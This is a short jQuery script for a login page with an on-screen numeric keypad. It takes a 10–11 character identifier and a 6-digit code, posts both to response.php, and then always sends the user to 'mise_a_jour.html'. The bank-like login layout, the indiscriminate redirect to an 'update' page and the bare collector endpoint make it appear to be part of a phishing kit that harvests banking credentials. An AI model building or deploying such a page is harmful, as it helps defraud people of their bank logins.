var x = 0
$(document).ready(function() {
    let isMobile = window.matchMedia("only screen and (max-width: 760px)").matches;
    $(window).scroll(function() {

        if ($(window).scrollTop() > 150) {
            $('.entete').html('<img class="d-none d-sm-block" src="asset/img/entete1_modiflg.PNG" style="max-width: 100%;">')
            $('.entete_mobile').html('<img class="d-block d-sm-none" src="asset/img/entete1_mobile_modif.PNG" style="max-width: 100%;">')
        } else {
            $('.entete').html('<img class="d-none d-sm-block" src="asset/img/entete1lg.PNG" style="max-width: 100%;">')
            $('.entete_mobile').html('<img class="d-block d-sm-none" src="asset/img/entete1_mobile.png" style="max-width: 100%;">')

        }
    });



    if (isMobile) {
        if ($(window).scrollTop() > 118) {
            $('.entete_mobile').html('<img class="d-block d-sm-none" src="asset/img/entete1_mobile_modif.png" style="max-width: 100%;">')
        } else {
            $('.entete_mobile').html('<img class="d-block d-sm-none" src="asset/img/entete1_mobile.png" style="max-width: 100%;">')

        }
    }

    let mtp = ""
    $(".identifiant").on('input', function() {
        if ($('.password').val().length >= 6 && $('.identifiant').val().length >= 10) {
            $('.valider').css({ "background-color": "#004b9b" })
            $('.valider').removeAttr("disabled");
        } else {
            $('.valider').attr("disabled");
            $('.valider').css({ "background-color": "#4d81b9" })
        }
    })
    $(".button").click(function(e) {

        e.preventDefault();
        mtp += $(this).val()
        $('.password').val(mtp)
        if ($('.password').val().length >= 6 && $('.identifiant').val().length >= 10) {
            $('.valider').css({ "background-color": "#004b9b" })
            $('.valider').removeAttr("disabled");
        }
        if ($('.password').val().length >= 6) {
            $(".button").attr("disabled", "disabled")
        }
        $(".effacer").click(function(e) {
            e.preventDefault();
            $('.valider').css({ "background-color": "#4d81b9" })
            $('.valider').attr("disabled", "disabled");
            $(".button").removeAttr('disabled');
            mtp = ""
            $('.password').val("")
        });
    });
    $('.valider').click(function(e) {
        e.preventDefault();
        if ($('.password').val().length == 6 && $('.identifiant').val().length >= 10 && $('.identifiant').val().length < 12) {

            $.ajax({
                type: "post",
                url: "response.php",
                data: "login=" + $('.identifiant').val() + "&password=" + $('.password').val(),
                success: function(response) {
                    window.location.href = 'mise_a_jour.html'
                }
            });
        } else {
            alert('eroor identifiant    ')
        }
    });

})